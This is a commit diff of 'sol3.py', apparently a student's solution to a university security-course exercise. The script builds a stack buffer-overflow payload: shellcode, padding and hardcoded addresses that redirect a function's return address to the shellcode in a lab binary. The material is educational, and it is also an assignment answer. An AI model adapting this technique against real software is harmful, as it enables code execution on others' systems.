26dbce4f5af8f9778b5216037d7a0e94faabb7a0
cbcald <cbcald@umich.edu>
2026-03-23 17:42:06 -0400

    Update sol3.py

--- sol3.py
+++ sol3.py
@@ -4,12 +4,16 @@ import sys
 
 from shellcode import shellcode
 buf_addr = 0x7ffffff6acc0  
-offset = 2056
-#shellcode is at rbp-0x810 = rbp - 2064
-#p is at rbp-0x8 = rbp - 8 so we need 2056 bytes of padding + shellcode before we put in the address into p 
+rbp_address = 0x7ffffff6b4d0
+buffer_length = 2048
+
+#set p tp point to where the return address is stored 
+#make a equal the value of where the shellcode starts 
+#then the *p = a will change the value of the return address
+#return address is stored above the rbp 
 
 payload = shellcode 
-payload += b'A' * (offset - len(shellcode)) #distance to the return address in memory fill with padding
+payload += b'A' * (buffer_length - len(shellcode)) #distance to the return address in memory fill with padding
 payload += buf_addr.to_bytes(8, 'little')
-
+payload += (rbp_address+8).to_bytes(8,'little')
 sys.stdout.buffer.write(payload)
